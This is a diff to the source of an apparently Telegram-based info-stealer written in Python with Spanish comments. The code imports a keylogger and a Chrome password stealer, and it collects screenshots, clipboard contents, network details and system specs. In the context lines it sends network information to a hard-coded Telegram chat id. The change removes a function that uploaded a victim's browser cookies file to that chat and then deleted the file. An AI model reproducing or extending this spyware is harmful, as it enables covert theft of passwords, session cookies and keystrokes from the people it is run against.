@@ -1,7 +1,7 @@
 import asyncio
 from keylogger import llista_teclas
 import os
-from funciones import registro_errores, capture_screenshot, get_clipboard_content, obtener_informacion_red, obtener_especificaciones_sistema, get_cookies
+from funciones import registro_errores, capture_screenshot, get_clipboard_content, obtener_informacion_red, obtener_especificaciones_sistema
 from password_stealer import get_chrome_passwords
 
 async def capturar_teclas(bot):
@@ -43,18 +43,6 @@ async def informacion_red(bot):
     await asyncio.sleep(0.001)
     informacion_red = obtener_informacion_red()
     await bot.send_message(chat_id="817416698", text=f"{informacion_red}")
-
-async def cookies(bot):
-    await asyncio.sleep(0.002)
-    #Ejecuta la funcion de get_cookies() para obtener el path de las cookies
-    cookies_path = get_cookies()
-    #Envia el archivo cookies.json al chat
-    try:
-        await bot.send_document(chat_id="817416698", document=open(cookies_path, "rb"))
-        await asyncio.sleep(1)
-        os.remove(cookies_path)
-    except Exception as e:
-        registro_errores(f"Error al enviar las cookies: {e}")
         
 async def passwords(bot):
     await asyncio.sleep(0.003)
